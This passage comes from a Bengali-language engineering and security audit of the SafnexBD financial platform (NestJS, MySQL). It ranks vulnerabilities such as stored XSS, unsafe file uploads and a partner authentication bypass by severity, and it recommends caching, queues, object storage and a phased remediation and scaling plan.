১. **ডাটাবেজ আনঅ্যাভেইলেবল হলে:** সম্পূর্ণ সাইট ডাউন হয়ে যাবে; কোনো ক্যাশড পেজ সার্ভ হবে না।  
২. **এসএমএস গেটওয়ে ডাউন হলে:** লগইন বা পাসওয়ার্ড রিসেট রিকোয়েস্টে ইউজার এরর পাবে।  
৩. **সার্ভার মেমোরি ফুল হলে:** Node.js প্রসেস বন্ধ হয়ে যাবে এবং ক্লায়েন্ট 502 Bad Gateway পাবে।  
*সুপারিশ:* সার্কিট ব্রেকার প্যাটার্ন (Circuit Breaker) এবং হেলথ চেক এন্ডপয়েন্ট (`/health/liveness`, `/health/readiness`) যুক্ত করা।

---

## 21. Backup & Disaster Recovery

* **কোডবেস যাচাই:** কোডবেসে কোনো অটোমেটেড ডাটাবেজ ব্যাকআপ বা ব্যাকআপ স্ক্রিপ্ট পাওয়া যায়নি।  
* *রেকমেন্ডেশন:*  
  - দৈনিক অটোমেটেড ফুল ডাটাবেজ ব্যাকআপ (Automated Daily Dumps)।  
  - পয়েন্ট-ইন-টাইম রিকভারির (PITR) জন্য MySQL Binary Logging (Binlog) চালু রাখা।  
  - ব্যাকআপ ফাইল আলাদা ক্লাউড স্টোরেজে (যেমন: AWS S3 Glacier বা Cloudflare R2) এনক্রিপ্ট করে সংরক্ষণ করা।

---

## 22. Logging & Monitoring

* **বর্তমান অবস্থা:** সাধারণ `console.log` এবং NestJS ডিফল্ট লগার ব্যবহৃত হচ্ছে।  
* **সীমাবদ্ধতা:** প্রোডাকশনে কোনো সেন্ট্রালাইজড লগ নেই। কোনো ট্রানজ্যাকশন এরর হলে সার্ভারে SSH না করে কারণ জানা সম্ভব নয়।  
* *রেকমেন্ডেশন:*  
  - **Sentry:** রিয়েল-টাইম ফ্রন্টএন্ড ও ব্যাকএন্ড ক্র্যাশ ট্র্যাকিং।  
  - **Pino / Winston:** স্ট্রাকচার্ড JSON লগিং।  
  - **Prometheus + Grafana:** RPS, মেমোরি, CPU ও ডাটাবেজ লেটেন্সি পর্যবেক্ষণ।

---

## 23. Testing & Load Testing

* **টেস্টিং স্ট্যাটাস:** কোনো ইন্টিগ্রেশন টেস্ট, ই-টু-ই (E2E) টেস্ট বা লোড টেস্ট স্ক্রিপ্ট নেই।  
* *রেকমেন্ডেশন:*  
  - **k6** অথবা **Locust** দিয়ে ১০,০০০ কনকারেন্ট ইউজারের লোড টেস্ট চালানো।  
  - ট্রানজ্যাকশন ও ওয়ালেটের জন্য কনকারেন্সি টেস্ট (একই সাথে একাধিক ডেবিট/ক্রেডিট রিকোয়েস্ট) তৈরি করা।

---

## 24. 1 Million User Scalability Analysis

| সিস্টেম কম্পোনেন্ট | বর্তমান অবস্থা | ১ লাখ কনকারেন্টে আচরণ | ১ মিলিয়ন স্কেলের জন্য প্রয়োজনীয় পরিবর্তন |
| :--- | :--- | :--- | :--- |
| **Auth System** | DB Join on JWT | ডাটাবেজ ওভারলোড হয়ে ক্র্যাশ করবে | Redis সেশন ক্যাশ ও স্টেটলেস ভ্যালিডেশন |
| **Product Search** | `LIKE '%...%'` | কুয়েরি টাইমআউট (১০-১৫ সেকেন্ড) | Elasticsearch বা MySQL Full-Text Index |
| **Wallet Ledger** | OFFSET Pagination | ৫০ পেজের পর মারাত্মক স্লো | Cursor-based Keyset Pagination |
| **File Storage** | Local Disk | মাল্টি-সার্ভারে ফাইল মিসিং | Cloudflare R2 / AWS S3 Object Storage |
| **Chat / Socket** | In-Memory Gateway | মেমোরি লিক ও ব্রডকাস্ট ফেইল | `@socket.io/redis-adapter` ও Redis Pub/Sub |
| **Notifications** | Synchronous HTTP | রিকোয়েস্ট লেটেন্সি অনেক বাড়বে | BullMQ Background Workers |

> *সতর্কবার্তা:* এটি কোড পরিদর্শনের ওপর ভিত্তি করে সম্ভাব্য ঝুঁকি বিশ্লেষণ; বাস্তব লোড টেস্ট ছাড়া সুনির্দিষ্ট পারফরম্যান্স পরিমাপ নয়।

---

## 25. Potential Bottleneck Map

| ক্রম | সম্ভাব্য বটলনেক | ফাইল ও মডিউল | ফাংশন / API | কারণ | প্রভাব | সমাধান |
| :---: | :--- | :--- | :--- | :--- | :--- | :--- |
| **1** | JWT DB Overload | `auth/jwt.strategy.ts` | `validate()` | প্রতি রিকোয়েস্টে ৫ টেবিল জয়েন | DB Crash under high RPS | Redis Session Caching |
| **2** | Full Table Scan | `products/products.service.ts` | `getProducts()` | `LIKE '%q%'` on LongText | CPU 100%, Query Timeout | Full-Text Search Index |
| **3** | Uncontrolled Uploads | `uploads/uploads.controller.ts` | `uploadFile()` | No Auth, 50MB Base64 Buffer | Disk full, Node OOM Crash | S3 Presigned URL Upload |
| **4** | Synchronous Blocking | `sms/otp.service.ts` | `sendOtp()` | HTTP-blocking 3rd party API | Slow response, Timeout | BullMQ Background Queue |
| **5** | In-memory Sockets | `chat/chat.gateway.ts` | `handleSendMessage()` | No horizontal socket adapter | Can't scale across servers | Redis Socket.io Adapter |
| **6** | Deep Pagination | `wallet/wallet.service.ts` | `getLedger()` | `OFFSET` on 1M+ rows | High latency on deep pages | Keyset Cursor Pagination |

---

## 26. Cost Optimization

১. **ব্যান্ডউইথ খরচ কমানো:**  
   বর্তমানে অরিজিনাল ফাইল সাইজেই ছবি সেভ ও সার্ভ করা হয়। WebP/AVIF ফরম্যাটে কনভার্ট এবং থাম্বনেইল জেনারেশন করলে ব্যন্ডউইথ খরচ ৭০% কমে যাবে।  
২. **সার্ভার কম্পিউট কমানো:**  
   স্ট্যাটিক ডাটা (ক্যাটাগরি, সেটিংস, মেনু) Redis-এ ক্যাশ করলে ডাটাবেজের ওপর ৯০% কোয়েরি কমে যাবে, ফলে ছোট ডাটাবেজ ইনস্ট্যান্সেও অনেক বেশি ট্রাফিক হ্যান্ডেল করা সম্ভব হবে।  
৩. **ক্লাউড স্টোরেজ বনাম নিজস্ব সার্ভার ডিস্ক:**  
   Cloudflare R2 ব্যবহার করলে কোনো Egress (ডাউনলোড) ব্যান্ডউইথ খরচ লাগবে না, যা এডব্লিউএস এস৩ এর চেয়ে অনেক সাশ্রয়ী।

---

## 27. Recommended Future Architecture

```
                                    [USERS / CLIENTS]
                                            │
                                            ▼
                                [CLOUDFLARE WAF & CDN]
                       (DDoS Defense, SSL, Edge Caching)
                                            │
                                            ▼
                               [NGINX LOAD BALANCER]
                        (Rate Limiting, Reverse Proxy)
                                            │
                  ┌─────────────────────────┴─────────────────────────┐
                  ▼                                                   ▼
       [APP SERVER INSTANCE 1]                             [APP SERVER INSTANCE 2]
         NestJS Node.js API                                  NestJS Node.js API
                  │                                                   │
                  └─────────────────────────┬─────────────────────────┘
                                            │
                        ┌───────────────────┼───────────────────┐
                        ▼                   ▼                   ▼
                 [REDIS CLUSTER]     [MYSQL CLUSTER]    [OBJECT STORAGE]
               - Caching Layer       - Primary (Write)    Cloudflare R2
               - Socket.io Adapter   - Replicas (Read)    (Images/Files)
               - BullMQ Queues       - ProxySQL Pool
                        │
                        ▼
                 [WORKER SERVICE]
             (SMS, Email, Push, Cron)
```

---

## 28. Priority-wise Recommendations

### Phase 1: Immediate Critical Fixes (১ম সপ্তাহ)
1. **Stored XSS দূরীকরণ:** `descriptionHtml` ইনপুটে এবং ফ্রন্টএন্ডে রেন্ডারের আগে স্যানিটাইজ করা।
2. **ফাইল আপলোড লকডাউন:** `/api/v1/uploads` এ JWT অথেন্টিকেশন, ফাইল টাইপ হোয়াইটলিস্ট এবং পাথে `path.basename` দিয়ে স্যানিটাইজ করা।
3. **Partner API Signature Fix:** `signature` না থাকলে রিকোয়েস্ট সরাসরি রিজেক্ট করা।
4. **WebSocket Auth:** সকেটে কানেক্ট হওয়ার সময় JWT টোকেন ভ্যালিডেশন বাধ্যতামূলক করা।

### Phase 2: High Priority Performance & Scalability (২য় - ৪র্থ সপ্তাহ)
1. **Redis Caching:** JWT ইউজার সেশন এবং সিস্টেম সেটিংস ক্যাশ করা।
2. **Rate Limiting:** `@nestjs/throttler` দিয়ে প্রতিটি এন্ডপয়েন্টে রেট লিমিট বসানো।
3. **Background Queue:** BullMQ দিয়ে SMS এবং ইমেইল ব্যাকগ্রাউন্ডে পাঠানো।
4. **Database Indexes:** কম্পোজিট ইনডেক্সগুলো যোগ করা।

### Phase 3: Medium Priority Optimization (২য় - ৩য় মাস)
1. **Object Storage Migration:** লোকাল ডিস্ক থেকে ক্লাউড স্টোরেজে (Cloudflare R2 / S3) ফাইল সরানো।
2. **Cursor Pagination:** `skip/take` এর পরিবর্তে `cursor` পেজিনেশন চালু করা।
3. **Full-Text Search:** প্রোডাক্ট সার্চের জন্য MySQL Full-Text ইনডেক্স বা Meilisearch যুক্ত করা।

### Phase 4: Long-term 1M Scale Readiness (৪র্থ - ৬ষ্ঠ মাস)
1. **MySQL Read Replicas ও ProxySQL কানেকশন পুলিং।**
2. **Socket.io Redis Adapter দিয়ে মাল্টি-সার্ভার রিয়েল-টাইম ক্লাস্টার তৈরি।**
3. **সেন্ট্রালাইজড মনিটরিং (Prometheus + Grafana + Sentry)।**

---

## 29. Critical Issues (জরুরি সমস্যা)

১. **Stored XSS in Products:**  
   - *অবস্থান:* `backend/src/products/products.service.ts` ও `frontend/src/app/products/[slug]/page.tsx`  
   - *ঝুঁকি:* সম্পূর্ণ অ্যাকাউন্ট টেকওভার ও অ্যাডমিন সেশন হাইজ্যাকিং।
২. **Unrestricted File Upload & Traversal:**  
   - *অবস্থান:* `backend/src/uploads/uploads.controller.ts` ও `uploads.service.ts`  
   - *ঝুঁকি:* সার্ভারে ম্যালিসিয়াস ফাইল আপলোড, ডিস্ক স্পেস নিঃশেষ ও লোকাল ফাইল ওভাররাইট।

---

## 30. High Priority Issues (উচ্চ অগ্রাধিকার)

১. **Auth Bypass in Partner Module:**  
   - *অবস্থান:* `backend/src/partner/partner.service.ts:225`  
   - *ঝুঁকি:* সিগনেচার হেডার বাদ দিয়ে যে কোনো পার্টনার অ্যাকাউন্টের ডাটা অ্যাক্সেস।
২. **Unauthenticated WebSocket Gateway:**  
   - *অবস্থান:* `backend/src/chat/chat.gateway.ts:29`  
   - *ঝুঁকি:* অন্য ইউজারের প্রাইভেট চ্যাট ও ট্রানজ্যাকশন নোটিফিকেশন আড়িপাতা।
３. **JWT Strategy DB Flooding:**  
   - *অবস্থান:* `backend/src/auth/jwt.strategy.ts:17`  
   - *ঝুঁকি:* প্রতিটি রিকোয়েস্টে ৫টি টেবিল জয়েন কোয়েরি ডাটাবেজ ক্র্যাশ করাবে।

---

## 31. Medium Priority Issues (মাঝারি অগ্রাধিকার)

১. **Weak OTP Generation & No Lockout:**  
   - `Math.random()` ব্যবহার এবং ভুল কোড দিলে লিমিট না থাকায় ব্রুট-ফোর্সের সুযোগ।
২. **No Rate Limiting:**  
   - লগইন ও ওটিপি এন্ডপয়েন্টে ব্রুট-ফোর্স ডিফেন্স নেই।
৩. **Database Full Table Scan in Search:**  
   - `LIKE '%q%'` দিয়ে LongText সার্চ করায় ডাটাবেজ স্লো হওয়া।

---

## 32. Low Priority Issues (নিম্ন অগ্রাধিকার)

১. **Hardcoded Fallback Secrets:**  
   - কোডে ডিফল্ট JWT সিক্রেট স্ট্রিং থাকা।
২. **Uncleaned OTPs:**  
   - মেয়াদোত্তীর্ণ ওটিপি ডাটাবেজে জমে টেবিল ভারী হওয়া।
৩. **BigInt JSON Replacer Overhead:**  
   - চ্যাটে প্রতি মেসেজে রিকার্সিভ রিপ্লেসার চালানো।

---

## 33. Strengths (ভালো দিকসমূহ)

১. চমৎকার ডাবল-এন্ট্রি বুককিপিং স্টাইলের আর্থিক লেজার (`wallet_ledger`)।  
২. ফ্লোটিং পয়েন্ট নির্ভুল রাখতে `Decimal(18, 4)` এর সঠিক বাস্তবায়ন।  
৩. পরিষ্কার মডুলার আর্কিটেকচার যা ভবিষ্যৎ মাইক্রোসার্ভিস বা সার্ভিস সেপারেশনে সহায়ক।  
৪. বিস্তারিত অডিট লগ ব্যবস্থা (`audit_logs`)।

---

## 34. Final Engineering Recommendations

১. কোনো কোড বা ফিচার পরিবর্তনের আগে অবিলম্বে **Stored XSS এবং File Upload সিকিউরিটি প্যাচ** করা উচিত।  
২. ডাটাবেজের ওপর অপ্রয়োজনীয় চাপ কমাতে **Redis Caching** যোগ করা অবিলম্বে প্রয়োজন।  
৩. সার্ভারের লোকাল ডিস্কে ফাইল রাখা বন্ধ করে **Cloudflare R2 / AWS S3** এ স্থানান্তরিত হতে হবে।  
৪. থার্ড-পার্টি সার্ভিসগুলোকে **BullMQ কিউ** এর মাধ্যমে ব্যাকগ্রাউন্ড প্রসেসিংয়ে নিতে হবে।

---

## 35. Conclusion

SafnexBD প্রজেক্টটির বিজনেস লজিক, ট্রানজ্যাকশন লাইফসাইকেল এবং ডোমেইন মডেলিং অত্যন্ত পরিণত এবং সুচিন্তিত। তবে একটি ফিন্যান্সিয়াল প্ল্যাটফর্ম হিসেবে এর বর্তমান সিকিউরিটি ঘাটতি এবং ক্যাশিং/কিউ-এর অনুপস্থিতি ১ মিলিয়ন ইউজার স্কেলিংয়ের প্রধান অন্তরায়। উল্লিখিত আর্কিটেকচারাল গাইডলাইন এবং ফেজ অনুযায়ী অপ্টিমাইজেশনগুলো সম্পন্ন করলে সিস্টেমটি অনায়াসে লাখ লাখ কনকারেন্ট ট্রাফিক ও ট্রানজ্যাকশন নিরাপদে পরিচালনা করতে সক্ষম হবে।

